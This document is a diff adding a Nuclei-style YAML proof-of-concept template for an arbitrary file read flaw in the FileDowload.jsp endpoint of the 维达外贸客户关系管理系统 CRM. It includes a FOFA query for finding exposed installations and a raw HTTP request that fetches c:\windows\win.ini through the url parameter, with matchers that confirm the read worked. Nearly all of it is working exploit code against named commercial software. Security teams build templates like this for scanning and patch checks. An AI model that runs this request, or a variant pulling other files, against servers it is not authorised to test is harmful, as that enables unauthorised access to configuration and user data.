@@ -1,0 +1,24 @@
+id: weida-crm-filedownload-file-read
+
+info:
+  name: "维达外贸客户关系管理系统 FileDowload 接口任意文件读取漏洞"
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: title="维达外贸客户关系管理系统"
+          该系统 FileDowload 接口存在文件访问控制缺陷，攻击者可通过构造特定参数绕过权限校验机制，直接获取服务器存储的任意文件内容。此漏洞可能暴露系统配置文件、用户数据及其他关键信息，从而为攻击者提供进一步渗透系统的潜在途径
+  tags: 维达外贸客户关系管理系统
+
+http:
+- raw:
+  - |
+    GET /file/FileDowload.jsp?url=c:\\windows\win.ini HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - "for 16-bit app support"
